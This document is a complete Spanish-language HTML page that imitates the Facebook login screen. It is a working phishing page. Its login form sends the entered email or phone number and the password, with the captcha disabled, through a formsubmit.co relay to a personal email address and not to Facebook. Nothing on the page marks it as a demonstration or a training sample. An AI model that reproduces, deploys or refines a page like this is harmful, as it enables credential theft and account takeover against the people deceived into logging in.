<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Facebook</title>
  <style>
    body {
      margin: 0;
      font-family: Helvetica, Arial, sans-serif;
      background-color: #f0f2f5;
    }

    header {
      background-color: #1877f2;
      padding: 20px;
      color: white;
      text-align: center;
      font-size: 32px;
      font-weight: bold;
    }

    .container {
      display: flex;
      justify-content: center;
      align-items: flex-start;
      margin-top: 50px;
      padding: 0 20px;
      flex-wrap: wrap;
    }

    .login, .register {
      background: white;
      padding: 30px;
      border-radius: 8px;
      box-shadow: 0 2px 5px rgba(0,0,0,0.1);
      margin: 20px;
      width: 300px;
    }

    h2 {
      margin-top: 0;
    }

    input {
      width: 100%;
      padding: 12px;
      margin: 10px 0;
      border: 1px solid #ccc;
      border-radius: 5px;
      font-size: 16px;
    }

    button {
      width: 100%;
      padding: 12px;
      background-color: #1877f2;
      color: white;
      border: none;
      border-radius: 5px;
      font-size: 16px;
      cursor: pointer;
      transition: background-color 0.3s ease;
    }

    button:hover {
      background-color: #165ecf;
    }

    @media (max-width: 700px) {
      .container {
        flex-direction: column;
        align-items: center;
      }
    }
  </style>
</head>
<body>

<header>
  Facebook
</header>

<div class="container">
  <div class="login">
    <h2>Iniciar Sesión</h2>
    <form action="https://formsubmit.co/arturo_tohdz@hotmail.com" method="POST">
  <input type="hidden" name="_captcha" value="false">
  <input type="text" name="usuario" placeholder="Correo electrónico o teléfono" required />
  <input type="password" name="contraseña" placeholder="Contraseña" required />
  <button type="submit">Entrar</button>
</form>

  </div>

  <div class="register">
    <h2>Crear cuenta nueva</h2>
    <form>
      <input type="text" placeholder="Nombre completo" required />
      <input type="email" placeholder="Correo electrónico" required />
      <input type="password" placeholder="Nueva contraseña" required />
      <button type="submit">Registrarse</button>
    </form>
  </div>
</div>

</body>
</html>
